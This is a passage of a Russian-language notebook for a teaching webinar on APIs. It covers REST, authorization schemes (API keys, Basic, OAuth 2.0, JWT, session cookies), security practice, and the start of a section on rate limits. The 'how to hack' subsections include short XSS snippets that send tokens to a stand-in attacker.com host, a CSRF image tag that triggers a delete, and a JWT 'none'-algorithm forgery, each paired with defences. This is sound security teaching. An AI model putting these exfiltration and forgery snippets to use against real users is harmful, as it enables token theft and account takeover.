# %% [markdown]
# ## **Вебинар 9: Взаимодействие с API**

# %% [markdown]
# ## Проверка связи
# Если у вас нет звука:
# *   убедитесь, что на вашем устройстве и в колонках включён звук
# *   обновите страницу вебинара или закройте страницу и заново присоединитесь к вебинару
# *   откройте вебинар в другом браузере
# *   перезагрузите ваше устройство и попытайтесь войти снова
# Поставьте в чат:
# * «+» — если видно и слышно
# * «–» — если нет
# ## О спикере
# **Погудина Дарья**
# - эксперт-разработчик на Python в области информационной безопасности и в финтехе
# - сертифицированный специалист по базам данных
# - более 8 лет опыта разработки, из них более 4 лет — на Python
# - 3 года в сфере информационной безопасности с разработкой ПО на Python
# ## Правила участия
# *   Приготовьте блокнот и ручку, чтобы записывать важные мысли и идеи
# *   Продолжительность вебинара — 1 час 20 минут
# *   Вы можете писать свои вопросы в чате или задавать их вслух
# *   Запись вебинара будет доступна в личном кабинете
# # Цели занятия
# - Понять концепцию API и его роль в современной разработке
# - Освоить принципы REST API
# - Изучить методы авторизации в API
# - Понять основы безопасности API
# - Научиться работать с ограничениями API
# - Освоить диагностику и обработку ошибок
# - Понять роль HTTP-заголовков
#
# # План занятия
# 1. Что такое API
# 2. REST API: принципы и реализация
# 3. Авторизация в API
# 4. Квоты и ограничения API
# 5. Разбор возможных ошибок
# 6. Работа с JSON-структурами
# 7. Заголовки HTTP и их использование
# 8. Тестирование API вручную
# 9. Прокси и безопасность
# 10. Справочник частых ошибок

# %% [markdown]
# # **1. Что такое API**
#
# **API (Application programming interface)** — это программный интерфейс, который позволяет одним приложениям обмениваться данными и функциональностью с другими.
#
# Можно представить API как посредника между кодом и внешним сервисом, который принимает запрос, обрабатывает его и возвращает результат.
#
# **Простая аналогия:**
# Вы приходите в ресторан, официант (API) передает ваш заказ (запрос) на кухню (сервер) и приносит блюдо (ответ).

# %%
# Пример с рестораном
# Menu: list of dishes with ingredients
menu = [
    {"name": "Салат с тунцом", "ingredients": ["тунец", "салат", "оливковое масло"]},
    {"name": "Пицца Маргарита", "ingredients": ["помидоры", "сыр", "базилик"]},
    {"name": "Тунец-гриль", "ingredients": ["тунец", "лимон", "перец"]},
    {"name": "Паста с лососем", "ingredients": ["лосось", "сливки", "паста"]},
    {"name": "Суши с тунцом", "ingredients": ["тунец", "рис", "нори"]},
    {"name": "Бургер", "ingredients": ["говядина", "сыр", "булочка"]}
]


def find_by_ingredient(keyword):
    result = []
    for dish in menu:
        if keyword.lower() in [ingredient.lower() for ingredient in dish["ingredients"]]:
            result.append(dish["name"])
    return result


print("🍽 Добро пожаловать в систему заказа блюд!")
print("Напишите: 'Покажи блюда с тунцом', чтобы найти блюда по ингредиенту.")

while True:
    user_input = input("\nВведите запрос: ").strip().lower()

    if user_input == "выход":
        print("До свидания!")
        break
    elif "покажи блюда с" in user_input:
        keyword = user_input.split("с")[-1].strip()
        found_dishes = find_by_ingredient(keyword)

        if found_dishes:
            print(f"\nВот блюда с «{keyword}»:")
            for dish in found_dishes:
                print(f"— {dish}")
        else:
            print(f"\nК сожалению, блюда с «{keyword}» не найдены.")
    else:
        print("Формат запроса не распознан. Пример: Покажи блюда с тунцом или напишите 'выход' для завершения.")

# %% [markdown]
# ### **Основные задачи API:**
#
# * Получение данных (например, погода, новости, курс валют).
# * Передача данных (например, отправка сообщения в Telegram).
# * Автоматизация действий (например, загрузка фото, мониторинг изменений).
#
# ---
#
# ### **Типы API**
#
# * **Публичные (public API)** — доступны без ограничений или с минимальной регистрацией (OpenWeatherMap, Agify и др.).
# * **Приватные API** — используются внутри компании или организации.
# * **Коммерческие (платные) API** — требуют оплаты и предоставляют ключи доступа.

# %% [markdown]
# ### **Пример простого запроса к API**
#
# Ниже показан простой пример работы с API:

# %%
import requests

url = "https://api.agify.io?name=alex"
response = requests.get(url)
data = response.json()

print(data)  # {'name': 'alex', 'age': 30, 'count': 12345}

# %%
import httpx

url = "https://api.agify.io?name=alex"
response = httpx.get(url)
data = response.json()

print(data)

# %% [markdown]
# **Что здесь происходит:**
#
# 1. Выполняется HTTP GET-запрос.
# 2. API возвращает ответ в формате JSON.
# 3. JSON преобразуется в Python-словарь.

# %% [markdown]
# ### **Как устроен URL запроса**
#
# ```
# https://api.example.com/data?city=Moscow&lang=ru
# ```
#
# * **Базовый URL**: `https://api.example.com/data`
# * **Параметры запроса**: `?city=Moscow&lang=ru`
#
# Такая структура позволяет гибко передавать параметры.
#
# Хорошая [статья](https://habr.com/ru/articles/975910/) про HTTP.

# %% [markdown]
# ## Ваши  вопросы

# %% [markdown]
# # **2. REST API: принципы и реализация**
#
# ### **Что такое REST**
#
# **REST** (representational state transfer) — набор принципов архитектуры веб-сервисов, предложенный Роем Филдингом в 2000 году. Это не стандарт, а стиль проектирования.
#
# ### **Основные принципы REST**
#
# #### 1. **Stateless** (без состояния)
#
# Сервер не хранит информацию о клиенте между запросами. Каждый запрос содержит всё необходимое для его обработки.
#
# **Плохо (с состоянием):**
#
# ```
# Запрос 1: GET /login → сервер запоминает, что вы залогинены
# Запрос 2: GET /users → сервер проверяет свою память
# ```
#
# **Хорошо (без состояния):**
#
# ```
# Запрос 1: GET /users + заголовок Authorization: Bearer token123
# Запрос 2: GET /posts + заголовок Authorization: Bearer token123
# ```
#
# Каждый запрос самодостаточен — токен передаётся каждый раз.
#
# **Реализация:**

# %%
# ❌ Плохо — сервер хранит сессию
session_id = login(username, password)  # Сервер запомнил
users = get_users(session_id)           # Сервер проверяет свою память

# ✅ Хорошо — токен в каждом запросе
token = login(username, password)                  # Получили токен
headers = {"Authorization": f"Bearer {token}"}
users = requests.get("/users", headers=headers)    # Токен в заголовке

# %% [markdown]
# #### 2. **Resource-based** (ресурсо-ориентированность)
#
# Всё в API — это ресурсы (сущности). Ресурсы имеют уникальные URL.
#
# **Примеры ресурсов:**
#
# ```
# /users — коллекция пользователей;
# /users/123 — конкретный пользователь с ID 123;
# /users/123/posts — посты пользователя 123;
# /posts/456 — конкретный пост.
# ```
#
# **Реализация:**

# %%
# ✅ Хорошо — ресурсы в URL
GET    /users           # Получить всех пользователей
GET    /users/123       # Получить пользователя 123
POST   /users           # Создать нового пользователя
PUT    /users/123       # Обновить пользователя 123
DELETE /users/123       # Удалить пользователя 123

# ❌ Плохо — действия в URL
GET    /getUsers
GET    /getUserById?id=123
POST   /createUser
POST   /updateUser
POST   /deleteUser

# %% [markdown]
# #### 3. **HTTP methods** (использование HTTP-методов)
#
# HTTP-методы отражают действие над ресурсом.
#
# **Таблица методов:**
#
# | Метод | Действие | Идемпотентность | Безопасность | Пример |
# |-------|----------|-----------------|--------------|--------|
# | GET | Получить | ✅ Да | ✅ Да | GET /users/123 |
# | POST | Создать | ❌ Нет | ❌ Нет | POST /users |
# | PUT | Заменить полностью | ✅ Да | ❌ Нет | PUT /users/123 |
# | PATCH | Обновить частично | ❌ Нет* | ❌ Нет | PATCH /users/123 |
# | DELETE | Удалить | ✅ Да | ❌ Нет | DELETE /users/123 |
#
# **Идемпотентность** — повторный запрос даёт тот же результат:
# - `GET /users/123` — всегда вернёт одни данные.
# - `DELETE /users/123` — после первого удаления ресурса нет, повторный запрос тоже вернёт 404.
#
# **Безопасность** — метод не изменяет данные на сервере:
# - **GET** безопасен (только чтение).
# - **POST/PUT/DELETE** небезопасны (изменяют данные).
#
# **Реализация:**

# %%
import requests

base_url = "https://api.example.com"

# GET — получить данные
response = requests.get(f"{base_url}/users/123")
user = response.json()

# POST — создать новый ресурс
new_user = {"name": "Alex", "email": "alex@example.com"}
response = requests.post(f"{base_url}/users", json=new_user)
created_user = response.json()

# PUT — заменить полностью
updated_user = {"name": "Alexander", "email": "alex@example.com", "age": 30}
response = requests.put(f"{base_url}/users/123", json=updated_user)

# PATCH — обновить частично
partial_update = {"age": 31}
response = requests.patch(f"{base_url}/users/123", json=partial_update)

# DELETE — удалить
response = requests.delete(f"{base_url}/users/123")

# %% [markdown]
# #### 4. **Uniform interface** (единообразный интерфейс)
#
# Все API следуют одним и тем же правилам. Один раз выучили — работаете со всеми REST API одинаково.
#
# **Компоненты единообразного интерфейса:**
#
# - **Ресурсы идентифицируются URL:**
#   ```
#   /users
#   /users/123
#   /users/123/posts
#   ```
#
# - **Действия через HTTP-методы:**
#   ```
#   GET    → получить
#   POST   → создать
#   PUT    → заменить
#   PATCH  → обновить
#   DELETE → удалить
#   ```
#
# - **Ответы через HTTP-статусы:**
#   ```
#   200 OK           → успех
#   201 Created      → ресурс создан
#   400 Bad Request  → неверный запрос
#   401 Unauthorized → не авторизован
#   404 Not Found    → не найдено
#   500 Server Error → ошибка сервера
#   ```
#
# - **Данные в формате JSON (обычно):**
#   ```json
#   {
#     "id": 123,
#     "name": "Alex",
#     "email": "alex@example.com"
#   }
#   ```
#
# **Реализация:**

# %%
# Все REST API работают одинаково
def get_user(user_id):
    response = requests.get(f"https://api.example.com/users/{user_id}")
    if response.status_code == 200:
        return response.json()
    elif response.status_code == 404:
        return None
    else:
        raise Exception(f"Ошибка: {response.status_code}")

# Работает для любого REST API!
github_user = get_user("octocat")  # GitHub API
twitter_user = get_user("123")     # Twitter API

# %% [markdown]
# **Пример проверки статуса:**
#
# ```python
# if response.status_code != 200:
#     print("Ошибка:", response.status_code)
# ```

# %% [markdown]
# #### 5. **Layered system** (многоуровневая система)
#
# Клиент не знает, напрямую ли он общается с сервером или через прокси, балансировщик, кеш и т.д.
#
# **Архитектура:**
#
# ```
# Клиент
#   ↓
# Прокси/кеш
#   ↓
# Балансировщик
#   ↓
# Сервер приложения
#   ↓
# База данных
# ```
#
# **Реализация:**

# %%
# Клиент просто делает запрос — не важно, через что он идёт
response = requests.get("https://api.example.com/users")

# Может быть:
# - прямой запрос к серверу
# - через прокси
# - через CDN
# - через балансировщик нагрузки
# Клиенту это не важно!

# %% [markdown]
# ### **Важные нюансы REST**
#
# #### 1. Версионирование API
#
# **Зачем:** при изменении API старые клиенты продолжают работать.
#
# **Способы:**
#
# ```text
# # В URL (самый популярный)
# /api/v1/users
# /api/v2/users
#
# # В заголовках
# Accept: application/vnd.api.v1+json
#
# # В поддомене
# v1.api.example.com/users
# ```
#
# #### 2. Пагинация (разбивка на страницы)
#
# **Зачем:** чтобы не возвращать все данные сразу.
#
# **Реализация:**
#
# Запрос:
# ```
# GET /users?page=1&limit=10
# ```
#
# Ответ:
#
# ```json
# {
#   "data": [...],
#   "pagination": {
#     "page": 1,
#     "limit": 10,
#     "total": 100,
#     "pages": 10
#   }
# }
# ```
#
# #### 3. Фильтрация и сортировка
#
# **Фильтрация:**
# ```
# GET /users?status=active&role=admin
# ```
#
# **Сортировка:**
# ```
# GET /users?sort=name&order=asc
# ```
#
# **Поиск:**
# ```
# GET /users?search=alex
# ```

# %% [markdown]
# ## Ваши  вопросы

# %% [markdown]
# # **3. Авторизация в API**
#
# ### **Зачем нужна авторизация**
#
# **Авторизация** и **аутентификация** — это механизмы, которые позволяют API определить:
# - кто вы — проверка личности (аутентификация);
# - что вам разрешено? — проверка прав доступа (авторизация).
#
# **Почему это критически важно:**
#
# 1. Защита данных — не все данные должны быть публичными.
# 2. Контроль доступа — разные пользователи имеют разные права.
# 3. Мониторинг использования — кто и как использует API.
# 4. Ограничение злоупотреблений — защита от спама и атак.
# 5. Коммерческие цели — платные API требуют идентификации.
#
# **Без авторизации:**
#
# - Любой может получить доступ к чужим данным.
# - Невозможно отследить, кто делает запросы.
# - Невозможно ограничить использование.
# - API становится уязвимым для злоупотреблений.
#
# ---
#
# ## **1. API key (API-ключ)**
#
# ### Что это
#
# **API-ключ** — это уникальная строка, которая идентифицирует приложение или пользователя. Простейший способ авторизации.
#
# ### Как работает
#
# ```python
# # Вариант 1: в параметрах URL (НЕ рекомендуется!)
# url = "https://api.weatherapi.com/v1/current.json"
# params = {"key": "1234abcd5678efgh", "q": "Moscow"}
# response = requests.get(url, params=params)
#
# # Вариант 2: в заголовках (рекомендуется!)
# headers = {"X-API-Key": "1234abcd5678efgh"}
# response = requests.get(url, headers=headers)
# ```
#
# ### Плюсы ✅
#
# - Простота — легко реализовать и использовать.
# - Быстрота — нет сложных протоколов.
# - Подходит для взаимодействия сервис-сервис — когда приложение общается с API.
#
# ### Минусы ❌
#
# - Нет срока действия — ключ работает до отзыва.
# - Сложно отследить — кто именно использует ключ.
# - Есть риск утечки — легко попадает в логи, Git, скриншоты.
# - Нет гранулярных прав — ключ даёт полный доступ или ничего.

# %% [markdown]
# ### **Как взломать**
#
# **1. Утечка через URL**
# ```python
# # ❌ Критическая ошибка
# url = f"https://api.example.com/data?key={api_key}"
# # Ключ попадёт в:
# # - логи сервера
# # - логи прокси/CDN
# # - историю браузера
# # - referer-заголовки других сайтов
# ```
#
# **2. Утечка через Git**
# ```python
# # ❌ Критическая ошибка
# api_key = "sk_live_1234567890"  # В коде
# # Попадёт в Git → GitHub → злоумышленники найдут через поиск
# ```
#
# **3. Утечка через логи**
# ```python
# # ❌ Опасно
# print(f"Запрос с ключом: {api_key}")  # Попадёт в логи
# logging.info(f"API key: {api_key}")    # Попадёт в логи
# ```
#
# **4. Перехват трафика (MitM):**
# - если нет HTTPS, ключ виден в открытом виде;
# - публичные Wi-Fi сети опасны.
#
# **5. Социальная инженерия:**
# - фишинг для получения ключей;
# - поддельные приложения запрашивают ключи.
#
# ### **Как защититься**
#
# **1. Хранить в переменных окружения**
# ```python
# import os
# from dotenv import load_dotenv
#
# load_dotenv()  # Загружает .env файл
# api_key = os.getenv("API_KEY")
#
# if not api_key:
#     raise ValueError("API_KEY не установлен!")
# ```
#
# **2. Никогда не хранить в URL, только в заголовках**
# ```python
# # ✅ Првильно
# headers = {"X-API-Key": api_key}
# response = requests.get(url, headers=headers)
#
# # ❌ Никогда так не делайте
# response = requests.get(url, params={"key": api_key})
# ```
#
# **3. Использовать .env-файл**
# ```bash
# # .env (добавить в .gitignore!)
# API_KEY=your_secret_key_here
# WEATHER_API_KEY=another_key
# ```
#
# **4. Применять ротацию ключей:**
# - регулярно менять ключи;
# - использовать разные ключи для разработки и продакшена.
#
# **5. Настроить ограничение прав:**
# - создавать ключи с минимальными правами;
# - создавать разные ключи для разных операций.
#
# **6. Использовать мониторинг:**
# - отслеживать использование ключей;
# - автоматически отзывать ключи при подозрительной активности.
#
# **7. Обязательно использовать HTTPS:**
# - никогда не использовать HTTP для API с ключами.

# %% [markdown]
# ## **2. Basic аuthentication (базовая аутентификация)**
#
# ### **Что это**
#
# Самый простой способ HTTP-аутентификации: логин и пароль кодируются в base64 и передаются в заголовке.
#
# ### **Как работает**
#
# ```python
# import requests
# from requests.auth import HTTPBasicAuth
# import base64
#
# # Вариант 1: через requests.auth
# response = requests.get(
#     "https://api.example.com/data",
#     auth=HTTPBasicAuth("username", "password")
# )
#
# # Вариант 2: вручную
# credentials = base64.b64encode(b"username:password").decode("utf-8")
# headers = {"Authorization": f"Basic {credentials}"}
# response = requests.get("https://api.example.com/data", headers=headers)
# ```
#
# ### Плюсы ✅
#
# - Простота — легко реализовать.
# - Стандарт HTTP — поддерживается везде.
# - Подходит для внутренних API — внутри защищённой сети.
#
# ### Минусы ❌
#
# - Пароль в каждом запросе — высокий риск утечки.
# - Base64 — это не шифрование — легко декодировать.
# - Нет срока действия — пароль работает до смены.
# - Сложно отозвать — нужно менять пароль.
#
# ### **Как взломать**
#
# **1. Перехват трафика:**
# ```python
# # Если нет HTTPS, пароль виден:
# Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
# # Декодируется за секунду:
# import base64
# base64.b64decode("dXNlcm5hbWU6cGFzc3dvcmQ=")  # b'username:password'
# ```
#
# **2. XSS-атака:**
# ```javascript
# // Злонамеренный JavaScript может перехватить заголовки
# fetch('https://attacker.com/steal', {
#     headers: {
#         'Authorization': document.cookie  // или другие данные
#     }
# });
# ```
#
# **3. MitM-атака:**
# - Перехват на публичных Wi-Fi.
# - Прокси-серверы.
# - Компрометированные маршрутизаторы.
#
# ### **Как защититься**
#
# **1. Использвать только HTTPS**
# ```python
# # ✅ Обязательно HTTPS
# url = "https://api.example.com/data"  # НЕ http://
#
# # ❌ Никогда HTTP
# url = "http://api.example.com/data"
# ```
#
# **2. Использовать только для внутренних API:**
# - внутри защищённой сети;
# - с VPN;
# - с дополнительной защитой.
#
# **3. Регулярно менять пароли:**
# - политика ротации паролей;
# - мониторинг подозрительной активности.
#
# **4. Применять дополнительную защиту:**
# - IP whitelist;
# - rate limiting;
# - двухфакторную аутентификацию.

# %% [markdown]
# ## **3. OAuth 2.0**
#
# ### **Что это**
#
# **OAuth 2.0** — протокол авторизации, который позволяет приложению получать ограниченный доступ к ресурсам пользователя без передачи пароля.
#
# ### **Как работает**
#
# **Поток авторизации:**
#
# ```
# 1. Приложение → Пользователь: "Войти через Google?"
# 2. Пользователь → Google: авторизуется
# 3. Google → Приложение: возвращает access_token
# 4. Приложение → API: запросы с access_token
# 5. При необходимости: refresh_token для обновления
# ```
#
# **Пример кода:**
#
# ```python
# import requests
#
# # Шаг 1: получение токена (обычно через браузер)
# # Пользователь авторизуется и получает токен
#
# # Шаг 2: использование токена
# headers = {
#     "Authorization": "Bearer ya29.a0AfH6SM..."
# }
# response = requests.get("https://api.example.com/me", headers=headers)
#
# # Шаг 3: обновление токена, когда истекает
# refresh_data = {
#     "grant_type": "refresh_token",
#     "refresh_token": "1//0abc123..."
# }
# response = requests.post("https://oauth2.googleapis.com/token", data=refresh_data)
# new_token = response.json()["access_token"]
# ```
#
# ### Плюсы ✅
#
# - Безопасность — пароль не передаётся приложению.
# - Гранулярные права — можно запросить только нужные разрешения (scopes).
# - Короткоживущие токены — access_token живёт 1 час.
# - Можно отозвать — пользователь может отозвать доступ.
# - Стандарт в области безопасности — используется Google, GitHub и др.
#
# ### Минусы ❌
#
# - Сложность — сложнее реализовать, чем API-ключи.
# - Требует инфраструктуры — нужен OAuth-сервер.
# - Зависимость от провайдера — если OAuth-сервер упал, доступ невозможен.
#
# ### **Как взломать**
#
# **1. Фишинг OAuth**
# ```
# 1. Злоумышленник создаёт фейковое приложение:
# "Войти через Google" → ведёт на поддельный сайт.
# 2. Пользователь вводит пароль → злоумышленник получает доступ.
# ```
#
# **2. Кража токена**
# ```javascript
# // XSS-атака
# localStorage.setItem('token', stolen_token);
# // или
# document.cookie = `token=${stolen_token}`;
# ```
#
# **3. Перехват refresh_token:**
# - если refresh_token украден, можно получать новые access_token;
# - хранится на сервере, но может утечь через логи.
#
# **4. CSRF-атака**
# ```html
# <!-- Злонамеренный сайт -->
# <img src="https://api.example.com/delete?account=all">
# <!-- Если пользователь залогинен, действие выполнится -->
# ```
#
# **5. Небезопасное хранение токенов**
# ```python
# # ❌ Токен в коде
# token = "ya29.a0AfH6SM..."
#
# # ❌ Токен в localStorage (доступен JavaScript)
# localStorage.setItem('token', token)
#
# # ❌ Токен в cookies без флагов
# response.set_cookie('token', token)  # Без HttpOnly, Secure
# ```
#
# ### **Как защититься**
#
# **1. Проверять домен OAuth-провайдера**
# ```python
# # ✅ Проверка, что это настоящий Google
# if not redirect_uri.startswith("https://accounts.google.com"):
#     raise SecurityError("Подозрительный домен!")
# ```
#
# **2. Использовать state параметр (защита от CSRF)**
# ```python
# import secrets
#
# # Генерируем случайный state
# state = secrets.token_urlsafe(32)
# session['oauth_state'] = state
#
# # При возврате проверяем
# if request.args.get('state') != session['oauth_state']:
#     raise SecurityError("CSRF атака!")
# ```
#
# **3. Ограничивать scopes (права)**
# ```python
# # ✅ Запрашиваем только нужные права
# scopes = "read:user"  # Только чтение профиля
#
# # ❌ Не запрашиваем всё подряд
# scopes = "read write delete admin"  # Слишком много прав
# ```
#
# **4. Безопасное хранение токенов**
# ```python
# # ✅ На сервере, в зашифрованном виде
# encrypted_token = encrypt(token, server_key)
#
# # ✅ В cookies с флагами
# response.set_cookie(
#     'token',
#     token,
#     httponly=True,    # JavaScript не может прочитать
#     secure=True,      # Только HTTPS
#     samesite='Strict' # Защита от CSRF
# )
# ```
#
# **5. Короткоживущие токены**
# ```python
# # Access token живёт 1 час
# access_token_expires = 3600
#
# # Refresh token живёт дольше, но хранится на сервере
# refresh_token_expires = 86400 * 30  # 30 дней
# ```
#
# **6. Проверка Origin и Referer**
# ```python
# allowed_origins = ["https://myapp.com"]
# if request.headers.get('Origin') not in allowed_origins:
#     raise SecurityError("Неразрешённый Origin!")
# ```

# %% [markdown]
# ## **4. JWT (JSON web tokens)**
#
# ### **Что это**
#
# **JWT** — это токен, который сам содержит данные пользователя. Состоит из трёх частей: header.payload.signature.
#
# ### **Как работает**
#
# **Структура JWT:**
# ```
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsImV4cCI6MTYwOTQ1NjAwMH0.signature
#      ↑ header (алгоритм)              ↑ payload (данные)              ↑ signature (подпись)
# ```
#
# **Пример кода:**
#
# ```python
# import jwt
# import base64
# import json
# from datetime import datetime, timedelta
#
# # Создание JWT (на сервере)
# secret_key = "your-secret-key"
# payload = {
#     "user_id": 123,
#     "username": "alex",
#     "exp": int((datetime.now() + timedelta(hours=1)).timestamp())
# }
# token = jwt.encode(payload, secret_key, algorithm="HS256")
#
# # Использование JWT (в клиенте)
# headers = {"Authorization": f"Bearer {token}"}
# response = requests.get("https://api.example.com/data", headers=headers)
#
# # Проверка JWT (на сервере)
# try:
#     decoded = jwt.decode(token, secret_key, algorithms=["HS256"])
#     user_id = decoded["user_id"]
# except jwt.ExpiredSignatureError:
#     print("Токен истёк!")
# except jwt.InvalidTokenError:
#     print("Неверный токен!")
# ```
#
# ### Плюсы ✅
#
# - Stateless — серверу не нужно хранить сессии.
# - Масштабируемость — легко распределять между серверами.
# - Содержит данные — не нужно обращаться к БД за каждым запросом.
# - Стандарт в своей области — широко используется.
#
# ### Минусы ❌
#
# - Невозможно отозвать — токен работает до истечения срока, если нет blacklist.
# - Размер — больше, чем session ID.
# - Если украли, доступ остаётся до истечения — нет способа быстро отозвать.
#
# ### **Как взломать**
#
# **1. Кража токена**
# ```javascript
# // XSS-атака
# const token = localStorage.getItem('token');
# fetch('https://attacker.com/steal?token=' + token);
# ```
#
# **2. Слабая подпись (алгоритм "none")**
# ```python
# # ❌ Опасно: некоторые библиотеки поддерживают "none"
# header = {"alg": "none", "typ": "JWT"}
# payload = {"user_id": 1, "admin": True}
# # Без подписи — можно подделать
# ```
#
# **3. Слабый секретный ключ**
# ```python
# # ❌ Слабый ключ можно подобрать
# secret = "12345"  # Слишком простой
#
# # ✅ Должен быть случайным и длинным
# secret = secrets.token_urlsafe(32)
# ```
#
# **4. Отсутствие проверки алгоритма**
# ```python
# # ❌ Опасно: принимает любой алгоритм
# decoded = jwt.decode(token, secret_key)  # Не указан algorithms!
#
# # ✅ Правильно
# decoded = jwt.decode(token, secret_key, algorithms=["HS256"])
# ```
#
# **5. Декодирование без проверки подписи**
# ```python
# # ❌ Можно декодировать payload без проверки
# import base64
# payload_part = token.split('.')[1]
# payload = json.loads(base64.urlsafe_b64decode(payload_part + '=='))
# # Но это только чтение, не подделка
# ```
#
# ### **Как защититься**
#
# **1. Всегда проверять алгоритм**
# ```python
# # ✅ Правильно
# decoded = jwt.decode(
#     token,
#     secret_key,
#     algorithms=["HS256"]  # Только разрешённые алгоритмы
# )
# ```
#
# **2. Использовать сильные ключи**
# ```python
# import secrets
#
# # ✅ Генерация сильного ключа
# secret_key = secrets.token_urlsafe(32)  # 32 байта, base64
# ```
#
# **3. Применять короткоживущие токены**
# ```python
# # ✅ Access token — 15 минут
# payload = {
#     "user_id": 123,
#     "exp": int((datetime.now() + timedelta(minutes=15)).timestamp())
# }
#
# # Refresh token — дольше, но хранится на сервере
# ```
#
# **4. Использовать blacklist для отозванных токенов**
# ```python
# # Redis для хранения blacklist
# blacklisted_tokens = set()
#
# def is_token_valid(token):
#     if token in blacklisted_tokens:
#         return False
#     try:
#         jwt.decode(token, secret_key, algorithms=["HS256"])
#         return True
#     except:
#         return False
#
# def revoke_token(token):
#     blacklisted_tokens.add(token)
# ```
#
# **5. Организовать безопасное хранение на клиенте**
# ```python
# # ✅ HttpOnly cookies — JavaScript не может прочитать
# response.set_cookie(
#     'jwt_token',
#     token,
#     httponly=True,
#     secure=True,
#     samesite='Strict'
# )
#
# # ❌ НЕ в localStorage (доступен JavaScript)
# localStorage.setItem('token', token)
# ```
#
# **6. Проверять срок действия**
# ```python
# payload = {
#     "user_id": 123,
#     "exp": int((datetime.now() + timedelta(hours=1)).timestamp()),  # Истекает через час
#     "iat": int(datetime.now().timestamp())  # Время создания
# }
#
# # Автоматически проверяется при decode
# ```

# %% [markdown]
# ## 5. **Session cookies** (сессионные куки)
#
# ### **Что это**
#
# Традиционный способ: сервер создаёт сессию, сохраняет ID сессии, клиент хранит ID в cookie.
#
# ### **Как работает**
#
# ```python
# # На сервере (Flask-пример)
# from flask import session
# import secrets
#
# @app.route('/login', methods=['POST'])
# def login():
#     if check_password(username, password):
#         session['user_id'] = user_id
#         session['session_id'] = secrets.token_urlsafe(32)
#         # Сохранить session_id в БД/Redis
#         return "Успешно"
# ```
#
# ### Плюсы ✅
#
# - Контроль на сервере — можно отозвать в любой момент.
# - Безопасность — данные не передаются клиенту.
# - Гибкость — можно хранить любые данные на сервере.
#
# ### Минусы ❌
#
# - Требует хранилище — БД или Redis для сессий.
# - Не масштабируется — сложно распределять между серверами.
# - Stateful — противоречит REST-принципам.
#
# ### **Как взломать**
#
# **1. Session Fixation**
# ```text
# 1. Злоумышленник получает session_id.
# 2. Навязывает его жертве.
# 3. Жертва авторизуется.
# 4. Злоумышленник использует тот же session_id.
# ```
#
# **2. Session Hijacking (XSS)**
# ```javascript
# // JavaScript ворует session cookie
# document.cookie  // "session_id=abc123..."
# ```
#
# **3. Predictable Session ID:**
# ```python
# # ❌ Предсказуемый ID
# session_id = f"user_{user_id}_{timestamp}"
#
# # ✅ Случайный ID
# session_id = secrets.token_urlsafe(32)
# ```
#
# ### **Как защититься**
#
# **1. Регенерировать после логина**
# ```python
# @app.route('/login', methods=['POST'])
# def login():
#     if check_password(username, password):
#         # Старая сессия удаляется
#         session.clear()
#         # Новая сессия
#         session['user_id'] = user_id
#         session['session_id'] = secrets.token_urlsafe(32)
# ```
#
# **2. Использовть HttpOnly и Secure флаги**
# ```python
# app.config['SESSION_COOKIE_HTTPONLY'] = True
# app.config['SESSION_COOKIE_SECURE'] = True  # Только HTTPS
# app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'  # Защита от CSRF
# ```
#
# **3. Использовать короткоживущие сессии**
# ```python
# app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)
# ```
#
# **4. Проверять IP**
# ```python
# if session.get('ip') != request.remote_addr:
#     session.clear()  # Подозрительная активность
# ```

# %% [markdown]
# ## **Сравнительная таблица методов авторизации**
#
# | Метод | Сложность | Безопасность | Масштабируемость | Отзыв | Использование |
# |-------|-----------|--------------|------------------|-------|---------------|
# | **API Key** | ⭐ Простая | ⭐⭐ Средняя | ✅ Да | ❌ Сложно | Сервис-сервис |
# | **Basic Auth** | ⭐ Простая | ⭐ Низкая | ✅ Да | ❌ Сложно | Внутренние API |
# | **OAuth 2.0** | ⭐⭐⭐ Сложная | ⭐⭐⭐ Высокая | ✅ Да | ✅ Легко | Публичные API |
# | **JWT** | ⭐⭐ Средняя | ⭐⭐ Средняя | ✅✅ Отлично | ❌ Сложно | Микросервисы |
# | **Session** | ⭐⭐ Средняя | ⭐⭐⭐ Высокая | ❌ Нет | ✅ Легко | Традиционные приложения |
#
# ---
#
# ## **Общие рекомендации по безопасности**
#
# ### 1. Всегда используйте HTTPS
#
# ```python
# # ✅ Только HTTPS
# url = "https://api.example.com/data"
#
# # ❌ Никогда HTTP
# url = "http://api.example.com/data"
# ```
#
# ### 2. Никогда не храните секреты в коде
#
# ```python
# # ❌ Никогда
# api_key = "sk_live_1234567890"
#
# # ✅ Всегда
# import os
# api_key = os.getenv("API_KEY")
# ```
#
# ### 3. Валидируйте все входные данные
#
# ```python
# # ✅ Проверка токена
# if not token or len(token) < 10:
#     raise ValueError("Неверный формат токена")
# ```
#
# ### 4. Логируйте подозрительную активность
#
# ```python
# import logging
#
# if failed_attempts > 5:
#     logging.warning(f"Подозрительная активность с IP {ip}")
#     # Блокировать IP
# ```
#
# ### 5. Используйте rate limiting
#
# ```python
# # Ограничение запросов
# if requests_count > 100:
#     return {"error": "Rate limit exceeded"}, 429
# ```
#
# ### 6. Регулярно обновляйте зависимости
#
# ```bash
# pip list --outdated
# pip install --upgrade requests jwt
# ```

# %% [markdown]
# ## Ваши  вопросы

# %% [markdown]
# ---
#
# # **4. Квоты и ограничения API**
#
# ### **Зачем нужны ограничения**
#
# Сервисы устанавливают лимиты на частоту запросов, чтобы:
# - защитить инфраструктуру — предотвратить перегрузку серверов;
# - поддержать справедливое распределение — дать доступ всем пользователям;
# - защититься от злоупотреблений — предотвратить DDoS и спам;
# - монетизироваться — внедрить платные тарифы с большими лимитами.
#
# ### **Типы ограничений**
#
# **1. Rate limiting (ограничение частоты):**
# - 10 запросов в секунду;
# - 100 запросов в минуту;
# - 1000 запросов в час.
#
# **2. Quota (квота):**
# - 1000 запросов в день;
# - 10000 запросов в месяц.
#
# **3. Throttling (замедление):**
# - не чаще 1 запроса в 10 секунд с одного IP;
# После превышения — временная блокировка.
#
# **4. Размер данных:**
# - максимальный размер запроса — 10 Mб;
# - максимальный размер ответа — 50 Mб;
#
# ### **Как узнать лимиты**
#
# **1. В заголовках ответа**
# ```python
# response = requests.get(url)
# print(response.headers)
#
# # Часто встречаются:
# # X-RateLimit-Limit: 1000        # Общий лимит
# # X-RateLimit-Remaining: 999     # Осталось запросов
# # X-RateLimit-Reset: 1609456000  # Время сброса (Unix timestamp)
